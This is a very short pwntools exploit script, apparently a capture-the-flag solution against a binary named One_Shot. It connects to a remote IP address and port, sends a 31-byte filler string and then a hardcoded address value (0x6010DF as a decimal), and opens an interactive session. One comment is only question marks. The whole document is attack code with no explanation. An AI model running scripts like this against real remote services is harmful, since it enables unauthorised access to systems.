from pwn import *
p=remote('47.103.214.163',20002)
#p=process('./One_Shot')

p.sendline('a'*31)

p.sendline('6295775')  #????????
#u64(p64(0x06010DF))
p.interactive()
